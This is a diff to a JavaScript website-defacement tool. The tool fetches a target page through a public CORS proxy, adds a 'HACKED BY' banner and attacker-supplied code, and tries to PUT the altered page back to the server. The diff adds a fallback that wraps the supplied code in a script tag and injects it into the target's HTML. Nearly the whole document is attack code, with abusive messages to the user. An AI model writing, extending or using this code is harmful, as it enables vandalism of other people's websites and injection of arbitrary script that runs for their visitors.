@@ -32,13 +32,16 @@ window.onload = function () {
     }
 };
 
+// CORS Anywhere Proxy (Self-Hosted if possible)
+const corsProxy = 'https://corsproxy.io/?'; // Replace with your own instance if possible.  Rate limiting is possible with this proxy.
+
 // Function to fetch content with CORS bypass and error handling
 async function fetchWithCORS(url) {
-  const corsProxy = 'https://api.codetabs.com/v1/proxy/?quest='; // Using codetabs.com proxy
     const proxiedUrl = corsProxy + encodeURIComponent(url);
 
     try {
         const response = await fetch(proxiedUrl, {
+            method: 'GET',
             mode: 'cors', // Explicitly set CORS mode
             headers: {
                 'Origin': window.location.origin, // Include origin header
@@ -95,31 +98,88 @@ async function performDefacement(targetURL, defacementCode) {
         const originalContent = await fetchWithCORS(targetURL);
         const modifiedContent = originalContent.replace('</body>', `<div style="color: purple; background-color: darkred; font-size: 2em; text-align: center;">HACKED BY Noodles Inc. - YOU JUST GOT FUCKED!</div>${defacementCode}</body>`);
 
-         // Use a proxy to bypass CORS for PUT requests
-         const corsProxy = 'https://api.codetabs.com/v1/proxy/?quest=';
-         const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
+        // Attempt to PUT the modified content.  If that fails, attempt to inject via script tag.
+        try {
+            // Use a proxy to bypass CORS for PUT requests
+            const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
 
-         const response = await fetch(proxiedUrl, {
-             method: 'PUT',
-             mode: 'cors',  // Explicitly set CORS mode
-             headers: {
-                 'Content-Type': 'text/html',
-                 'Origin': window.location.origin,  // Include origin header
-                 'X-Requested-With': 'XMLHttpRequest' // Add X-Requested-With header
-             },
-             body: modifiedContent,
-         });
+            const response = await fetch(proxiedUrl, {
+                method: 'PUT',
+                mode: 'cors',  // Explicitly set CORS mode
+                headers: {
+                    'Content-Type': 'text/html',
+                    'Origin': window.location.origin,  // Include origin header
+                    'X-Requested-With': 'XMLHttpRequest' // Add X-Requested-With header
+                },
+                body: modifiedContent,
+            });
 
-        if (!response.ok) {
-            throw new Error(`HTTP error! Status: ${response.status}`);
+            if (!response.ok) {
+                throw new Error(`HTTP error during PUT! Status: ${response.status}`);
+            }
+
+            logAction('Defacement successful using PUT!');
+        } catch (putError) {
+            console.warn("PUT request failed, attempting script injection:", putError);
+            logAction("PUT request failed, attempting script injection");
+            // Inject the defacement code using a script tag.  Less reliable, but bypasses some protections.
+            injectDefacement(targetURL, defacementCode);
         }
 
-        logAction('Defacement successful!');
     } catch (error) {
         console.error("Error:", error);
         alert("Something went wrong. Check the console, DIPSHIT.");
         logAction(`Critical error: ${error}`);
     }
+}
+
+// Function to inject defacement code using a script tag
+async function injectDefacement(targetURL, defacementCode) {
+  try {
+      const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
+      const response = await fetch(proxiedUrl, {
+          method: 'GET',
+          mode: 'cors',
+          headers: {
+              'Origin': window.location.origin,
+              'X-Requested-With': 'XMLHttpRequest'
+          }
+      });
+
+      if (!response.ok) {
+          throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+
+      let originalContent = await response.text();
+
+      // Create a script element with the defacement code
+      const scriptTag = `<script>${defacementCode}</script>`;
+
+      // Inject the script tag into the body of the original content
+      const modifiedContent = originalContent.replace('</body>', `${scriptTag}</body>`);
+
+      // Attempt to PUT the modified content back to the server
+      const putResponse = await fetch(proxiedUrl, {
+          method: 'PUT',
+          mode: 'cors',
+          headers: {
+              'Content-Type': 'text/html',
+              'Origin': window.location.origin,
+              'X-Requested-With': 'XMLHttpRequest'
+          },
+          body: modifiedContent
+      });
+
+      if (!putResponse.ok) {
+          throw new Error(`HTTP error during PUT! Status: ${putResponse.status}`);
+      }
+
+      logAction('Defacement successful using script injection!');
+  } catch (error) {
+      console.error("Error injecting script:", error);
+      alert("Failed to inject script. Check console for details, asshole.");
+      logAction(`Script injection error: ${error}`);
+  }
 }
 
 // Add form for target URL and defacement code
@@ -201,20 +261,19 @@ async function restoreWebsite(targetURL) {
         const backupResponse = await fetch(backupURL, { mode: 'cors' });
         const backupContent = await backupResponse.text();
 
-         // Use a proxy to bypass CORS for PUT requests
-         const corsProxy = 'https://api.codetabs.com/v1/proxy/?quest=';
-         const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
+        // Use a proxy to bypass CORS for PUT requests
+        const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
 
-         const response = await fetch(proxiedUrl, {
-             method: 'PUT',
-             mode: 'cors',  // Explicitly set CORS mode
-             headers: {
-                 'Content-Type': 'text/html',
-                 'Origin': window.location.origin,  // Include origin header
-                 'X-Requested-With': 'XMLHttpRequest' // Add X-Requested-With header
-             },
-             body: backupContent,
-         });
+        const response = await fetch(proxiedUrl, {
+            method: 'PUT',
+            mode: 'cors',  // Explicitly set CORS mode
+            headers: {
+                'Content-Type': 'text/html',
+                'Origin': window.location.origin,  // Include origin header
+                'X-Requested-With': 'XMLHttpRequest' // Add X-Requested-With header
+            },
+            body: backupContent,
+        });
 
         if (!response.ok) {
             throw new Error(`HTTP error! Status: ${response.status}`);
